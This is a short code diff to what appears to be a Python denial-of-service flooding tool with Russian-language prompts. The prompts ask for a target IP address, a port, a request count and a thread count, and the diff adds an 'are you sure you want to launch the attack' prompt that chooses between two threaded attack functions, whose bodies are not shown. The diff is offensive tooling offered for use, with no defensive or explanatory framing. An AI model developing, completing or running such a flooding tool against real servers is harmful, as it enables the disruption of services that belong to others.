@@ -33,6 +33,7 @@ if platform.system() == 'Linux':
 print("")
 ip= str(input("                      Введите айпи адрес: "))
 port= int(input("                      Введите порт: "))
+choice = str(input("                   Вы действительно хотите запустить атаку:"))
 times= int(input("                      Введите количество запросов: "))
 threads= int(input("                      Введите количество потоков: "))
 def run():
@@ -64,9 +65,9 @@ def run2():
 			print("Сервер не отвечает")
 
 for y in range(threads):
+	if choice == 'y':
 		th = threading.Thread(target = run)
 		th.start()
 	else:
-for y in range(threads):
 		th = threading.Thread(target = run2)
 		th.start()
